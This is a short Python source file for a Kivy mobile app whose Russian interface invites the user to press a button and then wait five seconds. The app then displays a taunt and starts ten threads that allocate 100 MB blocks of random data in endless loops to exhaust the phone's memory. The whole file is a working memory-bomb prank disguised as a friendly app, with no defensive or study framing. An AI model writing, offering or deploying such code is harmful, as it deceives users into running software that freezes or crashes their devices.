import threading
import os
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.clock import Clock

class KillerApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=50, spacing=20)
        
        self.label = Label(text="Привет! Нажми кнопку ниже,\nчтобы начать.", font_size='20sp', halign='center')
        layout.add_widget(self.label)
        
        btn = Button(text="НАЖМИ МЕНЯ", font_size='24sp', background_color=(0, 1, 0, 1))
        btn.bind(on_press=self.start_bomb)
        layout.add_widget(btn)
        
        return layout

    def start_bomb(self, instance):
        self.label.text = "Загрузка...\nПодожди 5 секунд."
        # Запускаем таймер на 5 секунд
        Clock.schedule_once(self.explode, 5.0)

    def explode(self, dt):
        self.label.text = "ХА-ХА-ЛОХ! ТЕЛЕФОН УМИРАЕТ!"
        
        # Запускаем 10 потоков, которые без остановки жрут память
        for _ in range(10):
            t = threading.Thread(target=self.memory_bomb)
            t.daemon = True
            t.start()
            
    def memory_bomb(self):
        mem_list = []
        while True:
            # os.urandom жрет реальную физическую память. 
            # Нет time.sleep() — остановки не будет.
            mem_list.append(os.urandom(100 * 1024 * 1024)) 

if __name__ == '__main__':
    KillerApp().run()
